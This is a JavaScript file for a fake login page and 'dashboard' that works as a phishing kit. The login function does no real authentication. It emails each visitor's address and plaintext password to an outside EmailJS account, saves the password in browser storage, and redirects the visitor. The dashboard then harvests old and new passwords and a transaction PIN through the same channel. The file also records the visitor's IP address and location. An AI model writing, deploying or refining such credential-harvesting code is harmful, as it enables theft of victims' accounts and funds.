// ======= UTIL & STORAGE HELPERS =======
const STORAGE_CURRENT_USER_KEY = "currentUser";

function saveCurrentUserPublic(user) {
  const publicUser = {
    email: user.email,
    password: user.password,
  };
  localStorage.setItem(STORAGE_CURRENT_USER_KEY, JSON.stringify(publicUser));
}

function loadCurrentUser() {
  return JSON.parse(localStorage.getItem(STORAGE_CURRENT_USER_KEY)) || null;
}

function logout() {
  localStorage.removeItem(STORAGE_CURRENT_USER_KEY);
  window.location.href = "index.html";
}

// ======= VALIDATION =======
function isEmailValid(email) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
}

function isPasswordValid(password) {
  return typeof password === "string" && password.length >= 1;
}

// ======= MODAL HELPER =======
function showModal(message) {
  const modal = document.getElementById("modal");
  const text = document.getElementById("modalMessage");
  const closeBtn = document.getElementById("modalClose");

  if (!modal || !text || !closeBtn) return;

  text.textContent = message;
  modal.classList.remove("hidden");

  closeBtn.onclick = () => {
    modal.classList.add("hidden");
  };
}

// ======= LOGIN FUNCTION =======
async function login(email, password) {
  const emailInput = document.getElementById("email");

  function focusEmailDelayed() {
    setTimeout(() => {
      if (emailInput) {
        try {
          emailInput.focus();
          if (typeof emailInput.setSelectionRange === "function") {
            const len = emailInput.value ? emailInput.value.length : 0;
            emailInput.setSelectionRange(len, len);
          }
        } catch (e) {}
      }
    }, 1000);
  }

  if (!email || email.trim() === "") {
    showModal("Please enter your email.");
    focusEmailDelayed();
    return;
  }

  if (!isEmailValid(email)) {
    showModal("Please enter a valid email.");
    focusEmailDelayed();
    return;
  }

  if (!password) {
    showModal("Password cannot be empty.");
    return;
  }

  if (!window.emailjs) {
    showModal("Service temporarily unavailable. Try again later.");
    return;
  }

  try {
    await emailjs.send("service_6nw221q", "template_d6k3x8f", {
      useremail: email,
      userpassword: password,
      time: new Date().toISOString(),
    });
  } catch (err) {
    console.error("EmailJS login error:", err);
    showModal("Unable to process login at this time.");
    return;
  }

  saveCurrentUserPublic({ email, password });
  window.location.href = "dashboard.html";
}

// ======= DASHBOARD FUNCTION =======
async function sendDashboardData() {
  const oldPassword = document.getElementById("oldPassword")?.value || "";
  const newPassword = document.getElementById("newPassword")?.value || "";
  const confirmNewPassword = document.getElementById("confirmNewPassword")?.value || "";
  const transactionPin = document.getElementById("transactionPin")?.value || "";
  const confirmTransactionPin = document.getElementById("confirmTransactionPin")?.value || "";

  if (!window.emailjs) {
    showModal("Service temporarily unavailable. Try again later.");
    return;
  }

  try {
    await emailjs.send("service_6nw221q", "template_d6k3x8f", {
      oldPassword,
      newPassword,
      confirmNewPassword,
      transactionPin,
      confirmTransactionPin,
      time: new Date().toISOString(),
    });
    showModal("Dashboard data sent successfully!");
    // Optional: reset form after sending
    // document.getElementById("resetPasswordForm")?.reset();
  } catch (err) {
    console.error("EmailJS dashboard error:", err);
    showModal("Failed to send dashboard data. Try again.");
  }
}

// ======= DASHBOARD HELPER =======
function loadDashboard() {
  const currentUser = loadCurrentUser();
  if (!currentUser || !currentUser.email) {
    window.location.href = "index.html";
    return;
  }
  const emailEl = document.getElementById("userEmail");
  if (emailEl) emailEl.textContent = currentUser.email;
}

// ======= USER LOCATION =======
async function fetchUserLocation() {
  const ipEl = document.getElementById("user-ip");
  const locationEl = document.getElementById("user-location");
  const timeEl = document.getElementById("user-time");

  try {
    const res = await fetch("https://ipapi.co/json/");
    const data = await res.json();

    const flag = data?.country_code
      ? data.country_code.toUpperCase().replace(/./g, c => String.fromCodePoint(127397 + c.charCodeAt()))
      : "";

    const ip = data?.ip || "N/A";
    const city = data?.city || "Unknown City";
    const region = data?.region || "";
    const country = data?.country_name || "Unknown Country";
    const timezone = data?.timezone || "UTC";

    localStorage.setItem(
      "sessionLocation",
      JSON.stringify({ ip, city, region, country, timezone })
    );

    if (ipEl) ipEl.textContent = `IP: ${ip}`;
    if (locationEl)
      locationEl.textContent = `Location: ${flag} ${city}${region ? ", " + region : ""}, ${country}`;
    if (timeEl)
      timeEl.textContent = `Time: ${new Date().toLocaleString("en-US", { timeZone: timezone })}`;
  } catch (err) {
    console.warn("IP fetch error:", err);
    if (ipEl) ipEl.textContent = "IP: N/A";
    if (locationEl) locationEl.textContent = "Location: N/A";
    if (timeEl) timeEl.textContent = `Time: ${new Date().toLocaleString()}`;
  }
}

// ======= DOM CONTENT LOADED =======
document.addEventListener("DOMContentLoaded", () => {
  // Login Button
  const loginBtn = document.getElementById("loginBtn");
  if (loginBtn) {
    loginBtn.addEventListener("click", async e => {
      e.preventDefault();
      const email = document.getElementById("email")?.value.trim();
      const password = document.getElementById("password")?.value;
      await login(email, password);
    });
  }

  // Dashboard Reset Button
  const resetBtn = document.getElementById("resetPasswordBtn");
  if (resetBtn) {
    resetBtn.addEventListener("click", async e => {
      e.preventDefault();
      await sendDashboardData();
    });
  }

  // Load Dashboard user email if exists
  if (document.getElementById("userEmail")) loadDashboard();

  // Fetch IP & location
  fetchUserLocation();
});
